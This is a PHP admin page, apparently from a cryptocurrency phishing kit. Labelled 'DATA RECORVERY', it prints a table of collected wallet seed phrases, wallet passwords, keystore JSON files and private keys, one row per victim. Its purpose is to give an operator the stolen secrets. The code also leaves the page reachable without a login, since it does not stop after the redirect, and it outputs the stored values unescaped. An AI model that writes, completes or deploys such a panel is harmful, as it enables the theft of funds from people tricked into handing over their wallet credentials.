
<?php 
    session_start();
    if (!$_SESSION['id']) {
        header('location:identification.php');
    }
      require_once "base.php";
?>

<!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
            <link rel="stylesheet" href="css/styles2.css"/>
            <title>Recorvery</title>
        </head>
        <body>
            <div class="title">
                <p class="entete"> DATA RECORVERY</p>
            </div>
            <div class="array">
                <table>
                    <tr>
                        <th>ID client</th>
                        <th>Sentences</th>
                        <th>Wallet Password</th>
                        <th>Keystore JSON</th>
                        <th>Private Key</th>
                    </tr>
                    <?php
                        $requete = "SELECT * FROM information ORDER BY id DESC ";
                        $pre = $bd->prepare($requete);
                        $pre->execute();

                        while ($a = $pre->fetch(PDO::FETCH_ASSOC)) {
                        ?>  
                            <tr>
                            <td><?php echo $a['id']?></td>
                            <td><?php echo $a['phrases']?></td>
                            <td><?php echo $a['wallet_password']?></td>
                            <td><?php echo $a['keystore_json']?></td>
                            <td><?php echo $a['private_key']?></td>
                        </tr><?php                   
                        }

                    ?>
                </table>
                <a href="deconnect.php">Deconnexion</a>
            </div>
        </body>
    </html>